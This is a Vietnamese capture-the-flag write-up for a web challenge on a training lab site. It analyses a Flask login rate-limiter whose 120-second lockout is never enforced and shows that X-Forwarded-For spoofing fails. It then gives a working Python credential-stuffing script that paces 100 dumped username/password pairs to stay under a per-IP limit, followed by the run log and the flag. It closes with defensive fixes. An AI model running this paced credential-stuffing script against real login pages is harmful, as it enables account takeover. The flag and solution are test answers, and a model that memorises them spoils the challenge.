# Writeup — Fool the Lockout (Silly Little Page)

- **Category:** Web — credential stuffing / vượt rate-limit
- **Target:** `http://chatelaine.cylabacademy.net:<PORT>/login` (port đổi mỗi lần restart instance)
- **Input:** `creds-dump.txt` (100 cặp `username;password`)
- **Flag:** `academy{f00l_7h4t_l1m1t3r_183a66ba}`

## TL;DR

Server giới hạn **10 POST / 30 giây**, khoá theo `request.remote_addr`. Hai phát hiện làm nên lời giải:

1. `X-Forwarded-For` **không** bypass được — nhưng cũng **không cần** bypass.
2. Cái "lockout 120 giây" trong code là **decoy**: biến `lockout_until` không hề được đọc khi
   quyết định chặn, nên lockout thực tế **chỉ ~30 giây**.

⇒ Bắn **10 request liên tiếp → nghỉ 30s → lặp lại**: nuốt hết 100 credential trong **~5 phút**,
tìm ra `tenille:lambert` → login → flag.

---

## 1. Recon

Trang login trả về form `POST` cùng URL, field `username` / `password`:

```html
<form id="input-form" method="POST">
  <label for="username">Username:</label>
  <input id="username" name="username" type="text">
  <label for="password">Password:</label>
  <input id="password" name="password" type="password">
  <input type="submit" value="Login" class="primary-button">
</form>
```

`Server: Werkzeug/3.1.8 Python/3.12.3` → Flask dev server (`app.run(..., debug=True)`).

Ba loại response phân biệt được rõ ràng bằng status code + độ dài body:

| Trường hợp | Status | Body | Dấu hiệu |
|---|---|---|---|
| Sai credential | `200` | **928** bytes | `<p class="error-message">Invalid username or password.</p>` |
| Bị rate-limit | `200` | **120** bytes | `<h1>Rate Limited Exceeded</h1>...` |
| Login đúng | `302` | — | `Location: /` (index chứa flag) |

---

## 2. Server chặn theo cái gì, và chặn bao nhiêu?

```python
MAX_REQUESTS     = 10     # số POST tối đa trong 1 epoch
EPOCH_DURATION   = 30     # độ dài 1 epoch (giây)
LOCKOUT_DURATION = 120    # "thời gian khoá" — thực chất KHÔNG được dùng khi chặn

def exceeded_rate_limit() -> bool:
    curr_time = time.time()
    client_ip = request.remote_addr          # <-- khoá theo IP thật, không đọc header nào
    refresh_request_rates_db(client_ip)
    if client_ip not in request_rates:
        request_rates[client_ip] = {"num_requests": 0, "epoch_start": -1, "lockout_until": -1}

    if request.method == "POST":             # chỉ POST mới tăng bộ đếm
        request_rates[client_ip]['num_requests'] += 1
        if request_rates[client_ip]['epoch_start'] == -1:
            request_rates[client_ip]['epoch_start'] = curr_time

    if request_rates[client_ip]['num_requests'] > MAX_REQUESTS:   # > 10 ⇒ chặn
        if request_rates[client_ip]["lockout_until"] == -1:
            request_rates[client_ip]['lockout_until'] = curr_time + LOCKOUT_DURATION
        return True
    return False


def refresh_request_rates_db(client_ip):
    curr_time = time.time()
    if client_ip not in request_rates:
        return
    if curr_time - request_rates[client_ip]["epoch_start"] > EPOCH_DURATION:   # hết epoch ⇒ reset
        request_rates[client_ip]["num_requests"] = 0
        request_rates[client_ip]["epoch_start"]  = -1
    if request_rates[client_ip]["lockout_until"] != -1 and time.time() >= request_rates[client_ip]["lockout_until"]:
        request_rates[client_ip]["lockout_until"] = -1
```

Ba điểm quyết định:

1. **Key là `request.remote_addr`** — không có `ProxyFix`, không đọc `X-Forwarded-For`.
2. **Chặn khi `num_requests > 10`** ⇒ trong 1 epoch cho **đúng 10 POST**, cái thứ 11 bị chặn.
3. **Epoch 30s tính từ POST đầu tiên** (không phải "mỗi request cách nhau 30s").

---

## 3. Chứng minh `X-Forwarded-For` không bypass được

Thí nghiệm: 2 burst liên tiếp, burst thứ hai dùng `X-Forwarded-For` **hoàn toàn mới**:

```
--- burst xff=A<timestamp> (n=12) ---
  req0..req9 : (0.5s, 200, len=928)  ok
  req10      : (0.47s, 200, len=120) BLOCKED
  req11      : (0.48s, 200, len=120) BLOCKED
--- burst xff=B<timestamp> (n=3) ---      <-- XFF mới tinh, chưa từng gửi
  req0: (0.49s, 200, len=120) BLOCKED
  req1: (0.74s, 200, len=120) BLOCKED
  req2: (0.48s, 200, len=120) BLOCKED
```

Kết luận:
- Burst đầu cho **đúng 10 request** rồi chặn ⇒ khớp `MAX_REQUESTS = 10` (xác nhận ngưỡng).
- Burst sau với XFF mới **vẫn bị chặn ngay** ⇒ bộ đếm **không** key theo header ⇒ XFF là red herring.

> Ghi chú: thao tác tay bằng Burp Repeater (đổi XFF) trông như "được" chỉ vì Repeater gửi rất chậm,
> không bao giờ vượt 10 request / 30s — không phải nhờ header.

---

## 4. Chứng minh "lockout 120s" là decoy

Điều kiện chặn trong code:

```python
if request_rates[client_ip]['num_requests'] > MAX_REQUESTS:
    if request_rates[client_ip]["lockout_until"] == -1:
        request_rates[client_ip]['lockout_until'] = curr_time + LOCKOUT_DURATION
    return True
```

`lockout_until` **chỉ được ghi**, không hề được đọc để quyết định `return True`. Nghĩa là "khoá 120s"
không có hiệu lực — thứ quyết định chặn hay không chỉ là `num_requests`, mà biến này bị reset về `0`
ngay khi `now - epoch_start > 30`.

Chuỗi sự kiện thực tế:

1. Vượt 10 request → chặn + set `lockout_until = now + 120`.
2. Sau ~30s kể từ POST đầu, `refresh_request_rates_db()` reset `num_requests = 0`.
3. `0 > 10` là `False` → **hết chặn sau ~30s**, dù thông báo ghi là "temporarily blocked".

⇒ **Lockout thật = `EPOCH_DURATION` = 30s.** Đó chính là chỗ "fool the lockout":
bạn chỉ cần chờ 30s, không phải 120s, và vẫn đi đúng nhịp tối đa của server.

Hệ quả về throughput: **10 credential / 30 giây** ⇒ 100 credential mất
`100 / 10 × 30 = 300s ≈ 5 phút`. Đây là **sàn thời gian**, không thể nhanh hơn.

> Vì epoch bắt đầu ở **POST đầu tiên**, chiến lược tối ưu là *bắn 10 request thật nhanh → nghỉ 30s →
> bắn tiếp*, chứ **không** phải "1 request mỗi 30s" (cách đó sẽ mất 50 phút cho 100 acc).

---

## 5. Script exploit — `haha.py`

```python
import time
import requests

WINDOW = 30            # = EPOCH_DURATION của server
MAX_PER_WINDOW = 10    # = MAX_REQUESTS của server

username, password = [], []
with open('creds-dump.txt', 'r') as file:
    for line in file:
        username.append(line.split(';')[0])
        password.append(line.split(';')[1].strip())

count = 0
url = "http://chatelaine.cylabacademy.net:<PORT>/login"

for i in range(len(username)):
    if count == 10:              # đủ 10 request -> hết epoch -> nghỉ để server reset bộ đếm
        count = 0
        time.sleep(WINDOW)

    payload = {
        'username': username[i],
        'password': password[i],
    }
    response = requests.post(url, data=payload, timeout=20)

    if "Invalid username or password." in response.text:
        print(f"Invalid credentials for {username[i]}:{password[i]}")
    else:
        print(f"Valid credentials found: {username[i]}:{password[i]}")

    count += 1
```

**Vì sao hoạt động:**
- Không cần `X-Forwarded-For` (đã chứng minh vô dụng) — chỉ cần đếm local.
- Cứ 10 POST thì `sleep(30)`: 10 request đó tiêu tốn >0s, nên request thứ 11 chắc chắn đến **sau**
  mốc `epoch_start + 30` ⇒ thoả `> EPOCH_DURATION` ⇒ không bao giờ chạm ngưỡng chặn.
- Chỉ ~10 lần nghỉ cho cả danh sách 100 dòng ⇒ tổng ~5 phút.

---

## 6. Kết quả

Chạy `haha.py` (log thật, rút gọn):

```
Invalid credentials for rora:winner1
Invalid credentials for birendra:rumble
...
Invalid credentials for my:hotsex
Invalid credentials for constantia:budlight
Valid credentials found: tenille:lambert        <-- dòng 71/100 của creds-dump.txt
Invalid credentials for suria:james007
...
Invalid credentials for percy:puddin
```

Bằng chứng cuối cùng — login lại bằng credential tìm được:

```
POST /login  data={'username': 'tenille', 'password': 'lambert'}
  -> 302 Found
  -> Location: /

GET / (kèm cookie session của request trên)
  -> 200 OK
  -> <flag>academy{f00l_7h4t_l1m1t3r_183a66ba}</flag>
```

**Flag:**

```
academy{f00l_7h4t_l1m1t3r_183a66ba}
```

> Flag đọc là *"fool that limiter"* — đúng luôn với lời giải: mày **lừa** cái limiter
> (nghỉ 30s thay vì tin vào con số 120s nó hét lên).

---

## 7. Vì sao lời giải chạy được & phía defender nên sửa gì

**Tóm tắt chuỗi lời giải:**
1. Recon → phân loại 3 loại response (928 B / 120 B / 302).
2. Đọc source → ngưỡng **10 POST / 30s**, key = `request.remote_addr`.
3. Chứng minh `X-Forwarded-For` vô dụng ⇒ bỏ luôn hướng bypass header.
4. Chứng minh `LOCKOUT_DURATION = 120` là decoy ⇒ lockout thật chỉ **30s**.
5. Gửi đúng nhịp tối đa 10 req/30s cho 100 credential ⇒ ~5 phút ⇒ `tenille:lambert` ⇒ flag.

**Vì sao vẫn "lách" được dù tôn trọng rate-limit:** vì giới hạn quá nới cho một danh sách nhỏ
(10/30s ⇒ 20 req/phút vẫn đủ quét 100 acc trong vài phút), và **không có** limit theo
username/account.

**Cách sửa cho đúng (defender):**
- Quyết định chặn phải **đọc** `lockout_until`:
  `if lockout_until != -1 and now < lockout_until: return True`.
  Hiện tại biến này là dead state ⇒ 120s không có tác dụng gì.
- Rate-limit **theo tài khoản** (per-username) song song per-IP, kèm backoff luỹ thừa — per-IP
  đơn thuần vẫn bị credential stuffing với nhịp chậm.
- Thực thi rate-limit **trước** khi xử lý form (hiện tại bộ đếm tăng nhưng thông báo lỗi vẫn
  khác nhau, cho phép phân biệt trạng thái bị chặn).
- Về phía client/attacker: thống kê status code (`302` = đúng) chắc chắn hơn là suy đoán từ
  văn bản lỗi.



